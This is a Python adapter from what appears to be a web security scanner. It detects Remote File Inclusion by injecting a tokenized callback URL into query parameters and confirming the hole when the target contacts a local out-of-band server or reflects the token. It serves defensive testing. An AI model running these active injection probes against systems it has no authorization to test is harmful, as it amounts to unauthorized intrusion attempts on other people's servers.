"""RFI adapter (detection, active) via out-of-band callback.

Remote File Inclusion is a blind class: the injectable param takes a URL that the server
fetches and includes. Detection needs an attacker-controlled host the target reaches back to.
This adapter stands up a local OastServer (reachable on the LAN), injects a per-URL tokenized
callback into each candidate param, and confirms RFI two ways: (1) the target called back to
our token (OAST), and (2) the included body token reflected in the response (in-band). Either
is proof. Requires options["oast_host_ip"] = an interface the target can reach.
"""

from __future__ import annotations

from urllib.parse import parse_qs, urlsplit

import httpx

from ...oast import OAST_BODY_TOKEN, OastServer
from ._targets import candidate_urls
from .base import AdapterResult, RunContext, ToolAdapter, register
from .session_util import _cookie_header


def _first_param(url: str) -> str | None:
    q = parse_qs(urlsplit(url).query)
    return next(iter(q), None)


@register
class RfiOastAdapter(ToolAdapter):
    name = "rfi_oast"
    stage = "scan"
    discovers = False
    detects = True
    active = True
    binary = None  # pure-python

    def run(self, ctx: RunContext) -> AdapterResult:
        host_ip = ctx.options.get("oast_host_ip")
        if not host_ip:
            return AdapterResult(tool=self.name, ok=False,
                                 note="no oast_host_ip configured (interface the target can reach)")
        targets = candidate_urls(ctx.seed_urls or [ctx.target], require_params=True,
                                 cap=ctx.options.get("inject_cap", 0))
        if not targets:
            return AdapterResult(tool=self.name, ok=True, note="no parameterized URLs")
        cmd = f"rfi-oast over {len(targets)} url(s) via {host_ip}"
        if ctx.dry_run:
            return AdapterResult(tool=self.name, ok=True, command=cmd, note="dry-run")

        cookie = _cookie_header(ctx.session, ctx.target)
        headers = {"Cookie": cookie} if cookie else {}
        findings: list[dict] = []
        timeout = ctx.options.get("http_timeout", 12)
        with OastServer(port=ctx.options.get("oast_port", 0)) as oast:
            for i, url in enumerate(targets):
                param = _first_param(url)
                if not param:
                    continue
                base = url.split("?")[0]
                token = f"rfi{i}x{abs(hash(base)) % 100000}"
                probe = oast.probe_url(host_ip, token)
                try:
                    r = httpx.get(f"{base}?{param}={probe}", headers=headers,
                                  timeout=timeout, follow_redirects=True)
                    reflected = OAST_BODY_TOKEN in r.text
                except Exception:  # noqa: BLE001
                    reflected = False
                called_back = oast.saw(token)
                if called_back or reflected:
                    channel = ("oast-callback" if called_back else "") + \
                              (("+" if called_back and reflected else "") if reflected else "") + \
                              ("in-band-include" if reflected else "")
                    findings.append({
                        "type": "rfi", "url": base, "param": param, "matched-at": base,
                        "channel": channel,
                        "evidence": "server fetched attacker-controlled URL"
                                    + (" and reflected it" if reflected else ""),
                    })
        return AdapterResult(tool=self.name, ok=True, findings=findings, command=cmd,
                             note=f"{len(findings)} confirmed RFI")
